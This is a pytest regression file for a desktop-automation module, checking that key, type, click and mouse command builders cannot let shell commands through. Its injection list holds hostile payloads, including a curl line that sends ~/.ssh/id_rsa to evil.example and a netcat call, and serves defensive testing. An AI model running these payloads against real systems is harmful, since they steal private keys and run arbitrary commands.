"""Desktop input builders must not smuggle a shell command into the desktop.

Continuing the coverage-as-a-search pass. ``arena/desktop`` was the largest
remaining block of uncovered statements in code that acts on the machine
(828), and it is code that moves the mouse and presses keys on the
operator's real desktop.

Most of that module cannot run in CI -- it needs X11/Wayland and a physical
session. The part that *can* be tested anywhere is the part that matters
most: the pure functions that build the command string. Their output goes to
``arena/desktop/exec.py::_desktop_exec``, which calls
``asyncio.create_subprocess_shell``. Anything unescaped in that string is
arbitrary command execution.

Measured across all six builder/backend combinations, exactly one leaked:

    ydotool  key(key=)   ydotool key x; touch /tmp/PWNED     <- unescaped
    ydotool  type        ydotool type --key-delay 50 '...'   <- quoted
    xdotool  key(key=)   DISPLAY=:0 xdotool key '...'        <- quoted
    xdotool  type        DISPLAY=:0 xdotool type ... '...'   <- quoted
    wtype    type        wtype '...'                         <- quoted

The fallback line was ``f'ydotool key {key}'`` with no quoting, so
``/v1/desktop/key`` with ``key="x; touch /tmp/PWNED"`` ran two commands.

Fixed by refusing, not by quoting. ``ydotool key`` accepts only a known key
name or raw ``CODE:STATE`` pairs; quoting an arbitrary string would close the
hole while shipping a command that silently does nothing. An honest error
beats a working-looking no-op.
"""
from __future__ import annotations

import shlex
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO))

from arena.desktop.input import (  # noqa: E402
    build_click_command,
    build_key_command,
    build_mouse_command,
    build_type_command,
)

# Payloads that end one command and start another, in shapes a shell honours.
INJECTIONS = [
    "x; touch /tmp/arena-pwned",
    "x && curl http://evil.example/$(cat ~/.ssh/id_rsa)",
    "x | nc evil.example 4444",
    "`id`",
    "$(id)",
    "x\ntouch /tmp/arena-pwned",
    "x' ; touch /tmp/arena-pwned ; '",
]

BACKENDS = [
    ("ydotool", {"has_ydotool": True}),
    ("xdotool", {"has_xdotool": True}),
    ("wtype", {"has_wtype": True}),
]

_BREAKOUT = (";", "||", "|", "`", "$(", "\n")


def _escapes_or_refuses(cmd: str | None, payload: str) -> bool:
    """True when the payload cannot break out of the built command.

    The obvious form of this helper is wrong, and it was written that way
    first: comparing against ``payload.replace("'", "'\\"'\\"'")`` matches the
    *raw* payload whenever the payload contains no quote character, so
    ``ydotool key x; touch /tmp/pwned`` was reported as safe. Ask shlex what
    the correctly-escaped form is instead of hand-rolling it.
    """
    if cmd is None:
        return True                      # refused outright: safest outcome
    if payload not in cmd:
        return True                      # mapped to a keycode, or dropped
    return shlex.quote(payload) in cmd   # present, so it must be quoted


@pytest.mark.parametrize("payload", INJECTIONS)
@pytest.mark.parametrize("backend,env", BACKENDS, ids=[b for b, _ in BACKENDS])
def test_key_builder_never_emits_an_unquoted_payload(backend, env, payload):
    cmd, _tool, _err, _label = build_key_command(env=env, key=payload)
    assert _escapes_or_refuses(cmd, payload), (
        f"{backend}: build_key_command emitted {cmd!r}. That string is handed "
        "to create_subprocess_shell -- an unquoted payload is code execution.")


@pytest.mark.parametrize("payload", INJECTIONS)
@pytest.mark.parametrize("backend,env", BACKENDS, ids=[b for b, _ in BACKENDS])
def test_key_builder_list_form_is_also_safe(backend, env, payload):
    cmd, _tool, _err, _label = build_key_command(env=env, keys=[payload])
    assert _escapes_or_refuses(cmd, payload), (
        f"{backend}: build_key_command(keys=[...]) emitted {cmd!r}")


@pytest.mark.parametrize("payload", INJECTIONS)
@pytest.mark.parametrize("backend,env", BACKENDS, ids=[b for b, _ in BACKENDS])
def test_type_builder_never_emits_an_unquoted_payload(backend, env, payload):
    cmd, _tool, _err = build_type_command(env=env, text=payload)
    assert _escapes_or_refuses(cmd, payload), (
        f"{backend}: build_type_command emitted {cmd!r}")


@pytest.mark.parametrize("backend,env", BACKENDS, ids=[b for b, _ in BACKENDS])
def test_click_coordinates_cannot_carry_metacharacters(backend, env):
    """Coordinates reach the shell too, so they must arrive as integers."""
    cmd, _tool, _err = build_click_command(env=env, x=12, y=34)
    if cmd is None:
        pytest.skip(f"{backend} has no click path")
    stripped = cmd.replace("&&", "").replace("2>/dev/null", "")
    for bad in ("`", "$(", "\n", ";"):
        assert bad not in stripped, f"{backend}: click cmd contains {bad!r}: {cmd!r}"


@pytest.mark.parametrize("backend,env", BACKENDS, ids=[b for b, _ in BACKENDS])
def test_mouse_coordinates_cannot_carry_metacharacters(backend, env):
    out = build_mouse_command(env=env, x=12, y=34)
    cmd = out[0]
    if cmd is None:
        pytest.skip(f"{backend} has no mouse path")
    stripped = cmd.replace("&&", "").replace("2>/dev/null", "")
    for bad in ("`", "$(", "\n", ";"):
        assert bad not in stripped, f"{backend}: mouse cmd contains {bad!r}: {cmd!r}"


@pytest.mark.parametrize("key,expected_fragment", [
    ("Return", "28:1 28:0"),
    ("ctrl+c", "29:1"),
    ("28:1 28:0", "28:1 28:0"),
])
def test_legitimate_keys_still_work(key, expected_fragment):
    """A refusal that refuses everything would be a regression, not a fix."""
    cmd, _tool, err, _label = build_key_command(env={"has_ydotool": True}, key=key)
    assert cmd is not None, f"legitimate key {key!r} was refused: {err}"
    assert expected_fragment in cmd


def test_unknown_key_is_refused_with_a_usable_message():
    """Fail closed, and say what would have worked."""
    cmd, _tool, err, _label = build_key_command(
        env={"has_ydotool": True}, key="NoSuchKeyName")
    assert cmd is None
    assert "unknown key" in (err or "")
    assert "CODE:STATE" in (err or ""), "the error should name the accepted form"


def test_the_detector_would_have_caught_the_original_bug():
    """Pin the regression itself, so the fix cannot be quietly reverted."""
    original = "ydotool key x; touch /tmp/arena-pwned"
    assert not _escapes_or_refuses(original, "x; touch /tmp/arena-pwned"), (
        "the helper no longer recognises the exact string this bug produced, "
        "so these tests would pass even if the bug came back")
